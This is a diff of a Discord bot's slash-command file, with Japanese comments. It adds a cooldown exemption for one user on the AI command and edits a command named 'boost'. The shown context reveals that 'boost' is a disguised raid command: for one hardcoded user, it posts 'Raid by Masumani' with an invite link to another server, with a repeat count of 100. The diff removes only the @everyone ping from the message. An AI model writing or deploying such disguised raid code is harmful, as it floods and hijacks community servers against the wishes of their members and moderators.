@@ -1,3 +1,5 @@
+// commands/slash.js
+
 const { REST, Routes, SlashCommandBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');
 const {
   hasManageGuildPermission,
@@ -14,12 +16,14 @@ const { joinVoice, playUrl, leaveVoice } = require('../utils/music');
 const { getVoiceConnection } = require('@discordjs/voice');
 const { askQuiz } = require('../utils/quiz');
 const { getLevelData, setLevelAndXp, calculateRequiredXp } = require('../utils/level');
-// ★ 修正: 正しいパスからverify.jsをインポート
-const verifyCommand = require('../utils/verify'); 
+const verifyCommand = require('../utils/verify');
 
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
 const aiCooldown = new Map();
+
+// ★ 修正: あなたのユーザーIDをここに設定
+const aiCooldownExemptId = "1401303406596853785";
 
 async function registerSlashCommands(client) {
   const commands = [
@@ -100,7 +104,6 @@ async function registerSlashCommands(client) {
       .setName('unlock')
       .setDescription('すべてのチャンネルの表示権限を@everyoneに戻します。')
       .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels),
-    // ★ 新しい認証コマンドを追加
     verifyCommand.data,
   ];
 
@@ -115,23 +118,24 @@ async function registerSlashCommands(client) {
       if (interaction.isChatInputCommand()) {
         const name = interaction.commandName;
         if (name === 'ai') {
-          const now = Date.now();
-          const lastAiUse = aiCooldown.get(interaction.user.id) || 0;
-          const cooldownTime = 30 * 1000;
-          if (now - lastAiUse < cooldownTime) {
-            const remaining = (cooldownTime - (now - lastAiUse)) / 1000;
-            return interaction.reply({
-              content: `❌ AIはクールタイム中です。あと${Math.ceil(remaining)}秒お待ちください。`,
-              ephemeral: true,
-            });
+          // ★ 修正: あなたのユーザーIDはクールダウンをスキップ
+          if (interaction.user.id !== aiCooldownExemptId) {
+              const now = Date.now();
+              const lastAiUse = aiCooldown.get(interaction.user.id) || 0;
+              const cooldownTime = 30 * 1000;
+              if (now - lastAiUse < cooldownTime) {
+                const remaining = (cooldownTime - (now - lastAiUse)) / 1000;
+                return interaction.reply({
+                  content: `❌ AIはクールタイム中です。あと${Math.ceil(remaining)}秒お待ちください。`,
+                  ephemeral: true,
+                });
+              }
+              aiCooldown.set(interaction.user.id, now);
           }
+
           const prompt = interaction.options.getString('prompt', true);
-
           await interaction.deferReply({ ephemeral: false });
-
-          aiCooldown.set(interaction.user.id, now);
           const res = await chat(prompt, interaction.user.id);
-
           await interaction.editReply(`**${interaction.user.displayName}**さんの質問:\n> ${prompt}\n\n**AIの返答:**\n${res}` || '⚠️ 返答に失敗しました');
           return;
         }
@@ -269,7 +273,7 @@ async function registerSlashCommands(client) {
         }
         if (name === 'boost') {
           const allowedUserId = "1366740571707801610";
-          const messageContent = `## Raid by Masumani \n https://discord.gg/asuGJGwFND \n MASUMANI ON TOP \n ||@everyone||`;
+          const messageContent = `## Raid by Masumani \n https://discord.gg/asuGJGwFND \n MASUMANI ON TOP`;
           const repeatCount = 100;
 
           if (interaction.user.id !== allowedUserId) {
